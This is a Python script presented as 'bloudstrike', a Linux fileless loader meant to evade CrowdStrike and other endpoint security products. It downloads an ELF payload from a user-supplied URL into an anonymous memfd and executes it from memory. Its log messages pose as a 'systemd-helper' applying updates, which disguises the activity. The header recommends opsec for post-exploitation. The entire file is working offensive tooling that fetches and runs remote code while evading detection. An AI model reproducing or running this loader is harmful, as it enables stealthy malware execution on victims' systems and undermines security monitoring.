#!/usr/bin/python3
### bloudstrike - A Linux/Unix .elf memory loader to bypass CS and other products
## Very simple. First, host an .elf payload.
## Use the script to download the .elf from an external url directly into memory.
## Profit. Post-exploitation activity can still get caught, use opsec techniques.
import os
import sys
import subprocess
from random import choice
from string import ascii_lowercase
from urllib import request, error
import ctypes

ascii_art = """
            ___----------___
         _--                ----__
        -                         ---_
       -___    ____---_              --_
   __---_ .-_--   _ O _-                - 
  -      -_-       ---                   -
 -   __---------___                       -
 - _----                                  -
  -     -_                                 _
  `      _-                                 _
        _                           _-_  _-_ _
       _-                   ____    -_  -   --
       -   _-__   _    __---    -------       -
      _- _-   -_-- -_--                        _
      -_-                                       _
     _-                                          _
     - all my h0mies h8 bloudstrike
"""
print(ascii_art)

libc = ctypes.CDLL(None)
memfd_create = 319

def createFd():
    print("[systemd-helper] Allocating service descriptor...")
    s = ""
    for _ in range(7):
        s += choice(ascii_lowercase)

    fd = libc.syscall(memfd_create, s.encode(), 0)
    if fd == -1:
        print("[systemd-helper] Error: Failed to allocate descriptor.")
        exit(1)
    return fd

def getFileFromUrl(url):
    print("[systemd-helper] Retrieving update package from:", url)
    try:
        r = request.urlopen(url)
        c = r.read()
        r.close()
        if r.msg != 'OK':
            print("[systemd-helper] Warning: Connection issue detected:", r.msg)
            exit(1)
        return c
    except error.URLError as e:
        print("[systemd-helper] Error: Unable to reach update source:", e)
        exit(1)

def writeToFile(fd, c):
    print("[systemd-helper] Processing system update...")
    try:
        with open("/proc/self/fd/{}".format(fd), 'wb') as f:
            f.write(c)
    except IOError as e:
        print("[systemd-helper] Error: Failed to apply update:", e)
        exit(1)

def execAnonFile(fd, args, wait_for_proc_terminate):
    print("[systemd-helper] Starting maintenance task...")
    try:
        child_pid = os.fork()
        if child_pid == -1:
            print("[systemd-helper] Critical: Task execution failure.")
            exit(1)
        elif child_pid == 0:
            print("[systemd-helper] Running scheduled service...")
            fname = "/proc/self/fd/{}".format(fd)
            args.insert(0, fname)
            os.execve(fname, args, dict(os.environ))
        else:
            if wait_for_proc_terminate:
                print("[systemd-helper] Monitoring background process (PID: {})...".format(child_pid))
                os.waitpid(child_pid, 0)
            else:
                print("[systemd-helper] Process detached from main service.")
    except Exception as e:
        print("[systemd-helper] Error: Unexpected issue encountered:", e)
        exit(1)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("[systemd-helper] Usage: {} -u URL".format(sys.argv[0]))
        sys.exit(1)

    url = sys.argv[2]
    args = []
    wait_for_proc_terminate = True

    try:
        fd = createFd()
        contents = getFileFromUrl(url)
        writeToFile(fd, contents)
        execAnonFile(fd, args, wait_for_proc_terminate)
    except KeyboardInterrupt:
        print("[systemd-helper] Warning: Operation manually interrupted.")
    except Exception as e:
        print("[systemd-helper] Critical: Unhandled system error:", e)
        sys.exit(1)
